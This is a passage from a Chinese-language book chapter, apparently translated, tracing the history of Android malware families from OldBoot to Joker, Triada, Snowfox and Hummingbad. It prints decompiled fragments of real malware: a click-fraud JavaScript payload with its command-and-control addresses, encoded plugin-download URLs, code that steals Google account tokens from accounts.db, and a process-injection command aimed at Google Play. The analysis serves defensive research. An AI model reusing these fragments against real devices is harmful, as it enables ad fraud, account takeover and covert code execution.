由于当时的 Android 版本尚未具备动态权限对话框，用户在安装应用时便已经同意了应用请求的所有权限。当用户启动 Taicliphot 应用时，他们已经授予了短信权限。这使得该应用能够使用如下代码向高级号码发送短信。

#### ***第一个预安装的恶意软件***

2014 年，我们还见证了预安装恶意软件的早期实例。中国安全公司奇虎 360 发现了一种名为 OldBoot 的预安装恶意软件家族，并在 1 月的博客中记录了它，文章标题为“Oldboot：Android 上的第一个引导木马”。不久之后，卡巴斯基发现了 UUPay，这是一个收集敏感用户信息并可能向用户电话账单添加费用的恶意软件家族，出现在中国设备上，并在 3 月的博客中进行了记录，文章标题为“警惕：预安装的恶意软件！”

Lookout Mobile Security 发现了 DeathRing，这是一个能够进行短信和 WAP 诈骗的木马家族。你可以在 2014 年 12 月的文章“DeathRing：预装恶意软件再次袭击智能手机”中了解相关内容。

当年的第四个发现是 CoolReaper，由 Palo Alto Networks 报告，并在 12 月的文章“CoolReaper 揭秘：Coolpad Android 设备中的后门”中进行了描述。CoolReaper 是一个强大的后门家族，由中国制造商 Coolpad 预装在设备上。

### **大型恶意软件网络的崛起：2015 年与 2016 年**

2015 年和 2016 年，Android 恶意软件继续快速发展，使这两年成为 Android 恶意软件研究中最有趣的时期。随着 Android 防御措施的变化，短信诈骗的利润下降，恶意软件作者开始尝试其他形式的滥用。本节涵盖了从木马、钓鱼到 DDoS 攻击、WAP 诈骗等各种示例。

#### ***土耳其点击器***

2014 年，一个新的恶意软件家族出现在 Google Play 上，并迅速臭名昭著：土耳其点击器。土耳其点击器应用从命令与控制服务器加载 JavaScript 代码，并在 WebView 中执行。当年，Android 安全团队在发现该恶意软件使用感染的设备对 Google Play 发起 DDoS 攻击时了解了这个家族。我们不确定这次攻击是故意的还是过于激进地试图操纵 Google Play 的应用排名机制所产生的副作用。无论如何，Android 安全团队迅速关闭了土耳其点击器，移除了其应用以停止攻击。

2015 年，土耳其点击器卷土重来，迅速成长为当时 Google Play 上最大规模的恶意软件网络。它是第一个扩展 Google Play 开发者账户创建的恶意软件网络，多年来创建了成千上万个账户。其恶意软件作者尝试了不同的赚钱方式，最终选择了点击欺诈和 WAP 欺诈，重点针对土耳其用户。2016 年 1 月，美国–以色列的安全公司 Check Point 在一篇名为《土耳其点击器：Check Point 发现 Google Play 上的新恶意软件》的博文中揭露了这个网络。

列表 2-9 展示了土耳其点击器应用*com.gkrj.djjsas*（v2，c901）从其指挥和控制服务器下载的美化载荷。

```
85.248.227.164
http://olmazsanolmazgudieruvickleri.org/p30.php
javascript: function rastgele(e, n) {
  return Math.floor(Math.random() * (n - e + 1) + e)
}

function fireEvent(e, n) {
  var i = e;
  if (document.createEvent) {
    var t = document.createEvent("MouseEvents");
    t.initEvent(n, !0, !1), i.dispatchEvent(t)
  } else document.createEventObject && i.fireEvent("on" + n)
}

for (var links = document.getElementsByTagName("a"), 
    elmalar = null, i = 0; i0) {
  fireEvent(document.links[i], "mouseover"),
  fireEvent(document.links[i], "mousedown"),
  fireEvent(document.links[i], "click");
  break
};
```

*列表 2-9：* com.gkrj.djjsas *(v2，c901) 下载的点击欺诈载荷*

第一行中的 IP 地址（似乎被应用忽略）可能属于一个 Tor 出口节点。第二行中的 URL 是一个次级指挥和控制服务器，恶意软件从中加载目标网站列表。在后面的列表中，JavaScript 代码包含点击欺诈功能，会在目标网站上点击广告。在 2016 年进行分析时，这些目标都是色情网站。

#### ***Gaiaphish***

虽然 2015 年最大的恶意软件网络主要集中在 WAP 欺诈，但中型网络展示了真正的创新性。多个网络开始通过窃取用户凭证接管像 Instagram 或俄罗斯社交网络 VK 等应用的社交媒体账户。另一个网络 Shuabang 则创建了无数新的 Gmail 账户，以操控 Google 产品。西班牙计算机安全公司 ElevenPaths 在 2014 年 11 月的博文《Shuabang Botnet：Google Play 中的 BlackHat 应用商店优化（BlackASO）》中首次描述了 Shuabang。

另一个名为 Gaiaphish 的网络，如*2017 年安卓安全年度回顾*报告所述，钓鱼 Google 账户凭证。此外，其应用动态加载代码以滥用各种 Google 网站。例如，*skt.faker.world*（v3，936c）包含 Base64 编码的 URL，从这些 URL 中下载额外的插件文件，针对 Google 的广告属性、社交网络 Google+以及 Google Play 本身（列表 2-10）。

```
static {
  String[] v0_1 = new String[3];
  v0_1[0] = "aHR0cDovL24yZm94LmNvbS9uZi9wbHVnaW5hcGs=";
  v0_1[1] = "aHR0cDovL3Bva2VyYWlyLmNvbS9uZi9wbHVnaW5hcGs=";
  v0_1[2] = "aHR0cDovL2l3YXNib3JudG9kaWUudXMvbmYvcGx1Z2luYXBr";
  com.google.dex.b.k = v0_1;
  return;
}
```

*列表 2-10：* skt.faker.world *(v3，936c) 中的 Base64 编码字符串*

此处显示的编码字符串解码后是以下 URL：

```
http://n2fox.com/nf/pluginapk
http://pokerair.com/nf/pluginapk
http://iwasborntodie.us/nf/pluginapk
```

下载的插件将其恶意功能隐藏在官方听起来的包名中，如*com.google.android.**或*com.google.dex.**。配置说明中包含了数十个参数。列表 2-11 展示了其中的一些。

```
name           = ct
versionGLib    = 16
debug          = false
app            = test
plusDelay      = 10000000
bannerShow     = 10000000
bannerHide     = 10000000
bannerDelay    = 10000000
banner         = disable
interCheat     = disable
bannerCheat    = disable
```

*列表 2-11：* skt.faker.world *(v3，936c) 中的 Gaiaphish 配置选项*

一个有趣的 Gaiaphish 特性是，它的应用程序会在 Google Play 上发布虚假评论，可能是为了付费，来提高其他应用的流行度和声誉。Gaiaphish 样本中包含许多这些虚假的应用评论，作为硬编码字符串。列表 2-12 展示了其中的一小部分。

```
private String reviewContent(Context context, com.google.android.w2x.GReview gReview) {
  String[] v1_0 = vn.com.nfox.android.cst.Constant.getShared(context).
     getString("reviewContent", "Love it very cute nice download it best game
     ever #This is a pretty good game it is fun ;-) # I like this game so much
     #This an amazing game# Thanks for the good game!!! # Lol this game is fun
      and cute.# This is such a fun, cute and addictive game! I love it! #
     like this game overall; its cute and fun to play.#Loved it I got it for
     free# My cousin sis luvs it n its a great game 2 play...").split("#");
```

*列表 2-12：来自* skt.faker.world *(v3, 936c)的虚假 Google Play 用户评论*

Android 恶意软件在操控 Google Play 应用排名方面有着悠久的历史。根据其犯罪程度，恶意软件可以从被钓鱼的 Google 帐户、自动生成的虚假 Google 帐户，或由人类操作的真实设备农场发布虚假评论。这些评分和评论越真实，就越能成功地诱使毫无戒心的用户下载应用程序。

#### ***Judy***

Judy，2016 年第二大恶意软件家族，通过广告欺诈赚钱。安全公司 Check Point 首次发现了这个家族，并在 2017 年 5 月的博客文章《Judy 恶意软件：可能是 Google Play 上发现的最大恶意软件活动》中描述了它。Judy 应用程序旨在对 Google 广告平台执行点击欺诈。

Judy 应用程序的代码可能有些复杂。它使用一个内部消息系统来定位 Google 广告并通过 JavaScript 执行欺诈性点击。列表 2-13 中的美化代码显示了*air.com.eni.AnimalJudy035*（v1250000, a72a）中的欺诈性点击活动。

```
public final void run() {
  float x = (
    net.shinhwa21.jsylibrary.MService.f(a.a(this.a)) *
    net.shinhwa21.jsylibrary.MService.g(a.a(this.a)));
  float y = ((
    net.shinhwa21.jsylibrary.MService.h(a.a(this.a)) *
    net.shinhwa21.jsylibrary.MService.g(a.a(this.a))) +
    net.shinhwa21.jsylibrary.MService.i(a.a(this.a)));
  ...
  MotionEvent motionEvent1 =
    MotionEvent.obtain(downTime, eventTime, ACTION_DOWN, x, y, 0);
  MotionEvent motionEvent2 =
    MotionEvent.obtain(downTime, eventTime, ACTION_UP, x, y, 0);

  a.a(this.a).a.dispatchTouchEvent(motionEvent1);
  a.a(this.a).a.dispatchTouchEvent(motionEvent2);
  ...
}
```

*列表 2-13：应用程序* air.com.eni.AnimalJudy035 *(v1250000, a72a)在先前定位的广告中点击一个随机像素。*

点击发生在`LODING5`消息到达后启动的线程中。为了实现这个点击，代码计算广告内部的随机 x 和 y 坐标。然后，通过两次调用`dispatchTouchEvent` API 来点击广告。

广告欺诈，无论是点击欺诈还是其他技术，主导了 2016 年后的 Android 恶意软件。这一盈利丰厚的类别仍然是恶意软件作者赚钱的少数直接途径之一，因为短信欺诈和加密货币挖矿已不再那么有利可图。许多其他恶意软件类别只能通过间接方式获利。例如，要从窃取的数据中赚钱，恶意软件作者必须找到买家。类似地，要从勒索软件中获利，恶意软件作者必须找到一个愿意（且有能力）支付赎金的受害者。

广告欺诈有另一个优势：它可以完全隐藏在用户的视线之外。这一点非常重要，因为用户可以察觉到并理解更具侵入性的恶意软件形式（例如，钓鱼攻击），并卸载被怀疑存在不正当行为的应用程序。广告欺诈可以在设备上保持未被检测的状态长达数年，为恶意软件作者带来长期的收入。

#### ***DressCode***

DressCode 是一个大型恶意软件网络，由 Check Point 发现，并在 2016 年 8 月的一篇名为《在 Google Play 上发现 DressCode Android 恶意软件》的博客文章中进行了描述，它有另一种创新的赚钱方式。它将感染的设备变成了代理僵尸网络的节点。恶意软件作者可以通过这些设备路由流量（比如，滥用流量来欺诈性地点击广告）以隐藏流量的来源。

DressCode 应用程序仅通过几个类实现其恶意软件功能。恶意软件作者重用了 2000 年在 CodeProject 上发布的示例代码（[*https://www.codeproject.com*](https://www.codeproject.com)），然后为其代理需求添加了额外的类。清单 2-14 展示了从 *com.dark.kazy.goddess.lp*（v1, d858）提取的美化代码。在连接到预配置的指挥和控制服务器后，代码解析从服务器接收到的基于文本的命令，并根据 `CREATE` 命令打开新的代理连接到其他指定的服务器。

```
String line[] = lines[i];
if (!line.equals("HELLO")) {
  if (!line.startsWith("PING")) {
    if (!line.startsWith("SLEEP")) {
      if (!line.startsWith("WAIT")) {
        if (line.startsWith("CREATE")) {
          String[] splitLine = line.split(",");
          if (splitLine.length == 3) {
            this.createConnection(
              splitLine[1], Integer.valueOf(splitLine[2]).intValue());
          }
```

*清单 2-14：应用程序* com.dark.kazy.goddess.lp *(v1, d858) 从其指挥和控制服务器解析各种代理命令。*

一旦控制了一个代理僵尸网络，恶意软件作者可以通过多种方式赚钱。例如，除了上面提到的示例，他们还可以将僵尸网络的访问权限卖给其他希望进行 DDoS 攻击的黑帮，或者他们可以将感染的设备变成 VPN 提供商的出口节点。

VPN 选项在 2016 年至 2021 年期间成为 Android 恶意软件滥用的最广泛形式之一。随着这些年用户对个人 VPN 服务需求的增加，一些不正当的 VPN 公司借助毫无察觉的 Android 用户建立了业务。这些 VPN 公司创建了代理 SDK，并支付给已有的 Android 开发者，将其嵌入到他们流行的应用中。安装了这些 SDK 的应用程序的用户，其设备变成了代理网络流量的终端节点。当然，这一切都没有告知用户。

像广告欺诈一样，这是将 Android 恶意软件货币化的一种简单方式。代理行为对用户来说和点击欺诈一样不可见，只要安装了带有代理 SDK 的应用程序，这种行为就可以持续下去。

#### ***Joker***

Joker 可能是 Google Play 历史上最大的恶意软件家族，甚至超越了土耳其点击器的规模。自 2016 年以来，它的开发者一直在为 Google Play 开发短信和 WAP 欺诈应用程序。

Android 安全团队在其*2017 年 Android 安全年终回顾*报告中首次提到 Joker，将其称为 BreadSMS。随后，在 2019 年 6 月，丹麦 CSIS 安全小组重新发现了 Joker，并在一篇名为《Joker 分析——GooglePlay 上的间谍和付费订阅机器人》的博客文章中进行了描述。该发布内容以及 Android 安全团队在 2020 年 1 月发布的后续博客文章《PHA 家族亮点：Bread（及其朋友们）》提供了关于这个家族的技术细节。

自 2019 年以来，Joker 一直反复出现在 Google Play 上，许多安全研究人员已对此进行了报告。直到今天，原始的 Joker 开发者可能仍在开发针对东南亚的 WAP 欺诈应用程序，但我们也认为，在 Joker 公开成功后，模仿者的恶意软件开发者纷纷涌现。如今，“Joker”已成为 Google Play 上 WAP 欺诈的统称，涵盖了若干个不同的恶意软件家族。

Joker 最有趣的方面是它的规模和巧妙的规避检测方法。从 2016 年到 2022 年，恶意软件开发者创建了数千个 Joker 应用程序。当 Android 安全团队和杀毒公司学会如何检测 Joker 时，开发者调整了防御措施以避免被发现。多年来，恶意软件开发者和防御者经历了多轮这种猫捉老鼠的游戏。因此，最近的 Joker 应用程序比大多数恶意软件家族更为复杂。

2021 年 11 月的 Joker 应用 *com.guo.smscolor.amessage*（v5，5445）展示了技术已经发展的程度。该应用包含一个加密文件 *assets/extersion/ex_compose*，实际上是原生的 ARM 代码。一旦应用解密并执行该文件，它将揭示加密的 DEX 代码，接着这些代码会被解密并执行。该代码从阿里巴巴的云服务下载名为 *adal.jar* 的文件并执行。这个 *adal.jar* 文件包含了实际的 WAP 欺诈代码。当然，在每个步骤中都采用了一些其他防御技术，如模拟器检测、代码混淆和加密。

Listing 2-15 展示了来自 *com.guo.smscolor.amessage*（v5，5445）的代码，它针对南非和泰国进行 WAP 欺诈。我们特意将其混淆，以展示当代 Joker 代码有多么难以理解。

```
if (v0_10 != null) {
  v0_11 = v0_10.getSimOperator();
    if (android.text.TextUtils.isEmpty(v0_11)) {
      v0_11 = "";
    }
  }

  vgy7.vgy7.vgy7.vgy7.bhu8.cft6 = v0_11;

if (vgy7.vgy7.vgy7.vgy7.bhu8.cft6.startsWith("655")) {
  if (vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1 == null) {
    vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1 =
      new vgy7.vgy7.vgy7.vgy7.cft6.bhu8(v5_0, 5);
  }
  if (vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2 == null) {
    vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2 =
      new vgy7.vgy7.vgy7.vgy7.cft6.bhu8(v5_0, 9);
  }
  vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1.nji9();
  vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2.nji9();
}

  if (("52001".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)) ||
     (("52003".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)) ||
      ("52023".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)))) {
    v0_0 = 1;
  }
  if (v0_0 != null) {
    String v0_8 = v2_8.bhu8;
    if ((v0_8 != null) && (v0_8.toLowerCase().startsWith(
      "http://ss1.mobilelife.co.th/wis/wap"))) {
      String v0_12 = new String(v2_8.mko0);
      this.bhu8.vgy7(v2_8.bhu8);
      this.bhu8.vgy7().cft6 = v0_12;
      vgy7.vgy7.vgy7.vgy7.mko0.vgy7 v2_12 = this.bhu8;
      String v3_42 = vgy7.vgy7.vgy7.vgy7.bhu8.vgy7(
        v0_12, "id=\"msisdn-4g-box\" value=\"", "\"");
```

*Listing 2-15：来自应用* com.guo.smscolor.amessage *(v5, 5445) 的示例代码*

这个示例展示了 *adal.jar* 如何针对不同国家和运营商。Android API `getSimOperator` 返回一个包含手机的移动国家代码和移动网络代码（MNC）的五位或六位字符串。然后，代码检查这个值是否以 655 开头，这是南非的 MCC。另一个地方，它将该值与 52001、52003 和 52023 进行比较。前缀 520 标识泰国，后缀 01、03 和 23 分别标识泰国的三大移动网络：AIS、AIS-3G 和 MTS。Joker 针对这些网络进行 WAP 欺诈。

南非和泰国是 WAP 欺诈的最常见目标之一。其他常见目标还包括东南亚国家（尤其是越南和印度尼西亚）以及中东地区（包括埃及、阿联酋、沙特阿拉伯等）。

**RAMNIT：当 Windows 恶意软件感染 Android 开发者**

作为一个有趣的附带说明，2015 年和 2016 年是 Windows 僵尸网络 Win32!Ramnit 的大年。这个僵尸网络感染了大量安卓开发者的 Windows 计算机，以至于它成为 2016 年 Google Play 第七大恶意软件家族。在感染的计算机上，Ramnit 将自身注入 ZIP 文件进行传播。由于安卓应用程序实际上就是带有 APK 文件扩展名的 ZIP 文件，Ramnit 也感染了这些应用程序。它并不是跨系统恶意软件，因此安卓用户安装含有 Ramnit 的应用程序并不构成危险。然而，安卓安全团队从 Google Play 中删除了含有 Ramnit 可执行文件的应用，并要求受感染的开发者清理他们的开发系统。

#### ***Triada***

当我们在本章早些时候讨论 Ghost Push 时，我们描述了一个蓬勃发展的中国恶意软件产业，涵盖了创作者和分发者的联系。来自这个网络的其他早期恶意软件样本包括 2014 年的 Triada 和 Chamois，2015 年的 Gooligan、Snowfox 和 YouTube Downloader，以及 2016 年的 Hummingbad。这些恶意软件家族规模庞大，分发模式复杂。虽然这些网络的早期版本通过 Google Play 和侧载传播，但它们的分发者后来将重点放在了一种更有效的分发方式上：渗透并破坏设备制造过程。

方便的是，大多数安卓设备都是在中国制造的，这使得中国的恶意软件作者很容易访问这些设备。一种常见的方式似乎是通过成立壳公司，伪装成合法的软件开发商。实际上，他们开发的软件包含后门和其他恶意内建功能。我们已经看到这些壳公司开发了空中更新解决方案、人脸解锁软件以及带有后门的字体管理软件，然后廉价地将这些技术出售给设备制造商。在集成过程中，壳公司要求制造商给予他们的软件深入访问安卓系统的权限，从而使恶意软件能够执行之前需要 root 权限的功能。

Triada 可能是最著名的预装安卓恶意软件家族。它首次由卡巴斯基在 2016 年 3 月的两篇博客文章中描述，分别是《Triada：安卓上的有组织犯罪》和《每个人看到的都不是他们想看到的》，它达到了前所未有的复杂程度。2019 年 6 月，安卓安全团队在《PHA 家族亮点：Triada》中发布了关于 Triada 能力的更多技术见解。同月，科技记者布赖恩·克雷布斯在《追踪安卓供应链攻击》一文中深入探讨了 Triada 的起源及其背后的人员。

要理解复杂的恶意软件家族是如何随时间发展演变的，查看早期样本很有帮助。这些样本通常较为原始，且包含的反分析技术较少，例如混淆和加密。随着恶意软件家族随时间的演变，了解它们的开发动机以及哪些方法有效，哪些无效，也是非常重要的。

Triada 的历史至少可以追溯到 2014 年 9 月，当时一个名为*com.untory.run1*（v1，251c）的样本首次出现。这个应用很容易理解，因为它使用了很少的防御技术。Java 包*security.**、*tools.**和*util.**包含了 Triada 代码的核心。唯一的混淆尝试是几个加密字符串，应用在运行时会通过嵌入的本地代码函数*libhzwtool.so*解密这些字符串。像本章前面描述的 Mono WAP 欺诈家族使用.NET 一样，使用本地库中的代码可以绕过仅分析 Java 代码的应用扫描工具。为了躲避这些有限的工具，Triada 的作者故意使用了本地代码作为反分析手段；而字符串解密函数并没有包含任何无法用 Java 实现的行为。

作为输入，字符串解密算法接受一个十六进制字符串和两个 16 字节的密钥。然后，它将密文的每个字节与两个密钥的相应字节进行异或（XOR）操作。两个密钥从资产文件*assets/hzwLib*的偏移地址 0x08 和 0x18 读取。多年来，Triada 一直将加密密钥隐藏在资产文件中，并使用简单的双异或解密算法，使新样本容易被识别。

对于其 rooting 能力，*com.untory.run1*（v1，251c）样本使用了 EasyRoot。这是由中国科技巨头百度开发的 Android SDK，包含了不同设备的 root 漏洞，并且可以自由供 Android 开发者嵌入他们的应用程序中。Triada 将 root 漏洞存储在*com.baidu.easyroot*包中。

我们认为，转向制造商渗透的原因部分是因为 Android 设备变得越来越难以获取 root 权限。我们从未看到这些中国网络部署过零日 rooting 能力，这表明他们之前依赖于别人开发的 root 漏洞。2015 年之后，公开的 root 漏洞变得极为稀少，发布之间可能会有多年间隔。由于等待时间过长，恶意软件开发者很可能不得不寻找其他方式来获取特权系统访问权限。

渗透设备制造商还有其他好处。预安装的软件可以进行即使是根权限漏洞也无法修改的设备修改，例如对安全设置（如 SELinux）的更改。此外，获得大量安装基础也变得更加容易：恶意软件分发者只需欺骗一家企业将他们的恶意软件安装到成千上万的设备上。这比向单个 Android 用户宣传产品，并希望他们选择安装它，任务要容易得多！这些优势帮助预安装恶意软件在 2015 年得到了广泛传播。

#### ***Chamois***

继 Triada 之后，Chamois 可能是 2018 年最具影响力的僵尸网络。Android 安全团队在 2017 年 3 月首次在一篇名为《检测并消除 Chamois：Android 上的欺诈僵尸网络》的博客中公开描述了它，它的起源可以追溯到 2014 年 11 月。

Chamois 在多个方面改进了 Triada，最显著的改进是引入了复杂的反分析功能。它包括几层比 Triada 复杂得多的加密本地代码，并隐藏至少 45 个环境检查，用于判断它是否运行在模拟环境中或是否受到安全研究人员的分析。尽管许多 Android 恶意软件样本已经具备类似的检查，但当时 45 个检查的数量是非常突出的。Android 安全团队在 2018 年《病毒公告》论文《解包打包解包器：逆向分析 Android 反分析本地库》中进一步讨论了这些特性。

Chamois 还是一个早期的恶意软件例子，它从使用 Google Play 作为感染途径转向了预安装在用户设备上的方式。在 Android 安全团队在 2017 年首次从 Google Play 中移除所有 Chamois 应用后，Chamois 的开发者开始联系 Android 设备制造商。官方上，他们提供了一种移动支付解决方案，但这个解决方案包含了隐藏的代码，用来下载和执行恶意功能，例如广告或短信欺诈。

#### ***Gooligan 和 Snowfox***

来自中国的另外两个 Android 恶意软件家族——Gooligan 和 Snowfox，在 2015 年和 2016 年侵入了数百万个 Google 账户。与其通过钓鱼攻击获取用户的 Google 账户凭证，这些恶意软件家族从 Android 操作系统的受保护部分窃取了 Google 账户令牌。这些账户令牌使盗贼能够完全控制受害者的账户。例如，他们可以登录受害者的 Gmail 账户，下载其 Google Drive 中的文件，或者查看他们保存在 Google Photos 中的照片。

常规应用无法访问存储 Google 账户访问令牌的操作系统区域。为了窃取令牌，第三方应用需要通过漏洞提升其权限，或者预装时已经获得了提升的权限。Gooligan 做到了这两点。正如 Check Point 在 2016 年 11 月的《超过 100 万 Google 账户被 Gooligan 入侵》报告中所描述的，Gooligan 使用了多个漏洞将其常规应用权限提升为 root 权限。它收集了设备配置的信息，将其发送到指挥与控制服务器，并下载了专门针对指纹识别设备类型的利用插件。

Snowfox，因其特有的 *com.snowfox* 包名而得名，是一个在 Gooligan 后被发现的 SDK。与 Gooligan 不同，它并没有下载利用插件以获取设备的 root 权限。相反，它预装在设备上，或者如果通过侧载安装，则依赖于设备已经被 root。Snowfox 极其强大，拥有一个广泛的插件系统，可以从其指挥与控制服务器下载额外的代码。我们已经观察到超过 30 个不同的插件文件，功能包括窃取 Google 账户令牌、广告欺诈或下载和安装更多应用。Android 安全团队首次在 *2018 Android 安全年度回顾* 报告中描述了 Snowfox。

Snowfox 应用的一个示例是 *com.zg.magicDrop* (v1, 9097)。该应用通过加密通道与其指挥与控制服务器通信后，下载恶意功能的插件，如 *snowfox*_*v19n.jar*。这个插件代码没有经过复杂的混淆。例如，列表 2-16 显示了用来窃取 Google 账户令牌的功能。它首先将账户数据库复制到另一个位置，然后使用 SQLite 命令从数据库中提取令牌。

```
com.snowfox.core.dy.util.DebugTool.info(
  com.snowfox.core.dy.util.GpAccount.TAG,
  new StringBuilder().append("ngPref.getIsRootToken()===")
    .append(v4_0.getIsRootToken()).toString());

if (v4_0.getIsRootToken()) {
  String v0_0 = com.snowfox.core.dy.util.GpAccount.copyConfigDb2SD(
    context, "/data/system/users/", v11_1, "accounts.db");
  v10_1.put(v0_0, com.snowfox.core.dy.util.GpAccount.readUserTokenNew(
    context, v0_0));
...
  android.database.Cursor v11_0 = v4_0.rawQuery(
  new StringBuilder().append(
    "select type, authtoken from authtokens where type " +
    " like 'com.android.vending%:androidmarket' and accounts_id=")
    .append(v1_0).toString(), 0);
```

*列表 2-16：应用* com.zg.magicDrop *(v1, 9097) 偷窃 Google 账户令牌*

VirusTotal 的反恶意软件扫描结果将 *snowfox*_*v19n.jar* 与 Xinyinhe 关联，Xinyinhe 是一家中国公司创建的另一个恶意软件家族。总部位于加利福尼亚的安全公司 Fire Eye 在 2015 年的博客文章《保证点击：移动应用公司控制 Android 手机》中讨论了这个家族，描述的功能和结构与 Gooligan 和 Snowfox 相似。是否这些应用属于同一家族，或者是否由同一开发人员开发尚不明确，因为许多中国恶意软件家族的插件化系统使得归属变得复杂。

#### ***Hummingbad***

2016 年，Check Point 发现了 Hummingbad，一个来自中国的复杂预安装恶意软件家族，具有大量动态下载的功能。特别引人注意的是，Hummingbad 使用 Linux 系统调用 `ptrace` 执行进程注入。一份 7 月的报告《从 Hummingbad 到更糟》描述了这一技术细节。

在示例 *com.swiping.whale*（v262, 783a）中，注入代码出现在 Java 包 *com.ry.inject.JNI* 中。两个资产文件，*assets/inject* 和 *assets/libhooker.so*，涉及到钩取 Google Play。*inject* 文件是一个常规的 Linux 可执行文件，接受命令行参数来指导钩取过程。清单 2-17 显示了 Hummingbad 如何构建整个进程注入命令。

```
String v2_0 = new StringBuilder().append(this.val$injectPath)
  .append(" ").append("com.android.vending").append(" ")
  .append(this.val$hookerPath).append(" hook_entry hahaha").toString();
```

*清单 2-17：Hummingbad 启动 Google Play 的进程注入*

第一个参数是要钩取的进程名称（*com.android.vending*，即 Google Play），第二个参数是要注入的二进制文件，*libhooker.so*。第三个参数是 *libhooker.so* 中的一个导出函数，在二进制文件注入到 Google Play 进程后被调用。

该二进制文件还包含一个 Java 代码文件，负责在注入后与 Google Play 交互。该代码允许 Hummingbad 操控 Google Play 界面，例如点击安装按钮并在未获得用户同意的情况下安装应用程序。

#### ***YouTube 下载器***

YouTube 下载器是一个相对较小的恶意软件家族，预装在低成本安卓设备上。为了分发恶意软件，某些有权限访问设备制造过程的人将恶意代码插入到谷歌应用程序中，如 YouTube（因此得名），有效地替换了合法的应用程序。

将恶意软件注入预装的 Google 应用程序使得杀毒应用程序更难清除设备上的病毒。由于技术限制，无法从设备中删除预装应用程序；我们只能禁用这些应用程序以防止其运行。然而，尝试禁用像 YouTube 这样的热门应用来保护用户可能不会成功，因为用户可能会重新启用它们以观看视频。

含有预装恶意软件的 YouTube 应用程序也无法更新为正版版本。原版的 YouTube 应用程序是用谷歌的私钥签名的。当恶意软件开发者将恶意代码注入到正版 YouTube 应用程序时，他们需要重新签名修改后的应用程序，以证明其完整性给安卓系统。但由于恶意软件开发者没有谷歌的私钥，他们必须使用自己的私钥。因此，当安装正版 YouTube 更新时，安卓系统会发现密钥不匹配并拒绝安装，这样代码签名的安全特性反而对用户产生了不利影响。最终，唯一能清除假 YouTube 应用程序的方式是设备制造商发布一个完整的系统更新来删除该应用。

YouTube Downloader 为接下来几年的恶意软件发展指明了方向。许多恶意软件开发者停止了开发新的预装恶意软件应用，而是专注于将恶意代码注入到合法的系统应用中。随着时间的推移，这些代码的位置变得越来越隐蔽。我们曾看到代码被注入到系统 UI 进程、更新进程，甚至 Android API 本身。禁用这些敏感应用和文件会使设备无法使用，使得当防病毒产品尝试保护用户时，面临着困难的局面。

除了分发方式外，YouTube Downloader 文件并不十分有趣。像*com.google.android.youtube*（v1599000099, 428a）这样的示例仅包含下载并安装其他应用的功能。我们省略了这些示例的代码，因为它们并不包含任何新颖的技术。

### **滥用的整合：2017 年及之后**

在 2017 年，Android 恶意软件开发者就如何从 Android 恶意软件中获利达成了共识。这一变化结束了前几年多样化、探索性的阶段，那时成功的恶意软件开发者使用了多种技术来赚钱。从 2017 年开始，最大的恶意软件家族是代理网络，如 Idle Coconut，WAP 欺诈家族，如前文描述的 Joker 和 Turkish Clicker，数据经纪人，如 OneAudience，以及广告欺诈家族，如 Android.Click.312.origin。在本节中，我们将重点关注后两类恶意软件。

初看起来虽然多样，但大多数现代恶意软件遵循一个共同的模式。首先，它对用户是不可见的。用户不喜欢滥用、恶意或令人讨厌的应用行为。如果他们认为某个应用有问题，他们会卸载它，从而结束开发者从中获利的可能。设置网络代理、吸取数据或点击不可见的广告都不是用户能轻易识别或归因于某个特定应用的行为。具有这种隐形功能的应用可以在设备上停留数月甚至数年，即使用户早已忘记它们，它们仍会在后台运行。

其次，现代恶意软件所需的 Android 权限非常少。要设置网络代理、生成欺诈性广告点击或连接到 WAP 欺诈网站，它们仅需要`INTERNET`权限。几乎每个 Android 生态系统中的应用都请求此权限，因此恶意软件作者可以在不引起不必要注意的情况下使用它。缺乏敏感或异常权限使得安全公司难以扫描和检测这种滥用行为。除了网络请求外，这些恶意软件与合法应用几乎无法区分。

第三，现代恶意软件处于法律和道德的灰色地带。一名盗取用户银行凭证并清空其银行账户的恶意软件作者将成为执法部门关注的焦点。然而，支付应用开发者嵌入代理 SDK 或收集用户数据的恶意软件作者不太可能被起诉。因此，恶意软件开发者不必是地下犯罪组织。看似合法的软件公司，拥有办公楼、社交媒体存在以及风险投资资金，也可以开发这类应用。

此外，许多成功的现代安卓恶意软件家族都使用 SDK。广告欺诈者、代理网络和数据经纪人从每个感染设备中赚取的利润较少，因此他们必须接触大量设备。为了达到这一点，这些恶意软件开发者构建 SDK 并说服合法开发者将其用于应用中，无论是自愿的还是付费的。在几起公开记录的案例中，恶意软件 SDK 被嵌入了数亿次安装量的应用中。没有其他已知方法可以让恶意软件开发者达到这个规模。

说服合法开发者将 SDK 嵌入其应用而不提过多问题，至少需要一种合法的外观，这也解释了为什么许多恶意软件公司伪装成安卓生态系统中的合法参与者。它们拥有专业的网站、LinkedIn 页面，甚至配备有客户经理与受欢迎的应用开发者建立关系。

SDK 方法还将成本和风险从恶意软件开发者转移到了毫无察觉的开发者身上。一旦恶意软件 SDK 被曝光，面临风险的将是合法开发者的 Google Play 账号被终止。SDK 背后的诈骗者通过在如塞舌尔等国家的壳公司掩盖他们的踪迹。一个名誉受损的壳公司可以轻易被同一群人运营的新壳公司替代。

#### ***OneAudience***

数据经纪人和安卓一样古老，但在 2017 年左右开始流行起来，那时更多的经纪人开始构建 SDK，并支付合法开发者将其偷偷嵌入应用中。这些 SDK 会尽可能地收集用户的位置信息历史、应用使用情况或网页浏览行为。由于这些数据的潜在买家不乏其人，许多公司不断挑战 Google Play 政策所允许的数据收集边界。

2016 年成立的美国公司 OneAudience 是该领域的早期参与者。其声明的目标是“通过将应用用户信息转化为广告商渴望的观众洞察，帮助开发者赚取新的收入。”2019 年，发现 OneAudience 提供了一个 Android SDK，未经用户同意收集 Twitter（2023 年更名为 X）和 Facebook 的信息。曝光后，该公司迅速宣布关闭。Facebook 随后对该开发者提起诉讼，涉及公司数据访问行为。根据 Facebook 2020 年 2 月的博客文章《采取行动反对平台滥用》，双方达成了和解。OneAudience 在其网站上确认了和解，但仍然关闭了其产品和公司。

